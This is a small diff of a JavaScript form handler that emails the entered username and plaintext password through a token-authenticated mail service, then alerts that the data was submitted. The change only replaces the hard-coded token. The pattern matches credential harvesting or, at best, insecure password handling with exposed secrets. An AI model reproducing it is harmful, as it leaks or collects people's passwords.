@@ -25,7 +25,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     <strong>Username:</strong> ${username} <br>
                     <strong>Password:</strong> ${password}
                 `,
-                SecureToken: "2539c652-ea84-490f-be5f-1ca5a0621a40"  
+                SecureToken: "e2bba7c0-7b20-4e9d-a08b-5832629480cd"  
             }).then(
                 message => alert(`Hi ${name}, your data has been submitted successfully.`)
             ).catch(
